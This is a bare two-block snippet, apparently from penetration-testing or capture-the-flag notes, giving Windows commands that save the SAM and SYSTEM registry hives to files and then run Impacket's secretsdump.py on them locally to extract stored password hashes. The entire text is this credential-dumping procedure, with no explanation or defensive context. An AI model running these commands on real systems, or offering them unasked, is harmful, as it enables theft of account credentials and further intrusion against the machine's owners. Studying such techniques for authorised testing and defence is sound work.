```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

```bash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```
